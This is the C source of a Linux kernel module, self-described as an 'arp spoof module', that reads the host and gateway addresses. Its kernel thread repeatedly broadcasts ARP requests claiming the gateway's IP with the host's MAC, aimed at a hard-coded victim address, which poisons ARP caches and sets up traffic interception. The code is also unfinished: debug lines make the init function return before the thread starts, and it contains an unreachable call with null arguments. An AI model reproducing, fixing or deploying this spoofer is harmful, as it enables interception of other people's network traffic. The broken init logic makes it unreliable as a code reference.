#include "types.h"
#include <linux/kernel.h>
#include <linux/module.h> //module macro
#include <linux/netdevice.h> //struct net_device
#include <linux/inetdevice.h> //struct in_ifaddr
#include <linux/inet.h> //in_aton()
#include <net/neighbour.h> //struct neighbour
#include <linux/sched.h> //struct task_struct
#include <linux/kthread.h> //kthread API
#include <linux/netfilter.h> //netfilter
#include <linux/netfilter_arp.h> //netfilter-ARP
#include <linux/skbuff.h> //struct sk_buff
#include <linux/delay.h> //msleep
#include <net/arp.h> //arp_send()
#include <linux/if_arp.h> //struct arphdr
#include <linux/slab.h> //kzalloc(), kree()
#include <linux/signal.h> //allow_signal()
#include <linux/sched/signal.h> //send_sig()
#include <linux/string.h>

//#undef CONFIG_IP_MULTIPLE_TABLES
#include <net/ip_fib.h>

static char * device = NULL;
module_param(device, charp, 0644); //name, type, permission
static char * gateway = NULL;
module_param(gateway, charp, 0644);
static char * victim = NULL;
module_param(victim, charp, 0644);

static struct task_struct * ts;
static struct adr_info host, gw;

static struct net_device * netdev;


static int init_device(void)
{
	struct in_ifaddr * addrs = NULL;

	if (!device)
		return -1;

	netdev = dev_get_by_name(&init_net, device);
	if (!netdev)
		return -1;

	if (!netdev->ip_ptr)
		return -1;

	addrs = netdev->ip_ptr->ifa_list;
	if (!addrs)
		return -1;

	host.paddr = addrs->ifa_address;
	memcpy(host.haddr, netdev->dev_addr, sizeof(host.haddr));

	printk("Host: %pI4 [%pM]\n", &addrs->ifa_address, netdev->dev_addr);
	return 0;
}

static int init_gateway(void)
{
	unsigned int ip;
	struct neighbour * neigh = NULL;
	extern struct neigh_table arp_tbl;	

	if (!gateway)
		return -1;

	ip = in_aton(gateway);
	neigh = neigh_lookup(&arp_tbl, &ip, netdev);
	if (!neigh)
		return -1;

	//neighbour."ha" is mac address field.
	memcpy(gw.haddr, neigh->ha, ETH_ALEN);
	gw.paddr = ip;

	printk("Gateway: %pI4 [%pM]\n", &gw.paddr, gw.haddr);
	return 0;
}

//arp_send: type, ptype, dest_ip, *dev, src_ip, *dest_hw, *src_hw, *target_hw
//eth:	source(*src_hw), dest(*dest_hw), proto(*ptype)
//arp:	1, 0x0800
//	4, 6,
//	op(type)
//	sha(*src_hw), sip(src_ip),
//	tha(*target_hw), tip(dest_ip); 

static int spoofer(void * ptr)
{
	unsigned int target = in_aton("10.20.12.113");

	allow_signal(SIGUSR1); //allow interrupt
	
	for (; !kthread_should_stop();)
	{
		msleep_interruptible(3000);

		arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
				gw.paddr, netdev->broadcast, host.haddr, NULL);	
	}
	
	return 0;
}

int spoof_init(void)
{
	struct fib_table * ftable = fib_get_table(&init_net, RT_TABLE_DEFAULT);
	if (!ftable)
	{
		printk("..\n");
		return -1;
	}
	else
	{
		printk("ZZ\n");
		return -1;
	}

	fib_lookup(NULL, NULL, NULL, 0);

	if (init_device() < 0)
		return -1;
	if (init_gateway() < 0)
		return -1;

	ts = kthread_run(spoofer, NULL, "requester");
	return 0;
}

void spoof_exit(void)
{
	if (ts->exit_state == 0)
	{
		send_sig(SIGUSR1, ts, 0);
		kthread_stop(ts);
	}
}

module_init(spoof_init);
module_exit(spoof_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("testkernel.tistory.com");
MODULE_DESCRIPTION("arp spoof module");
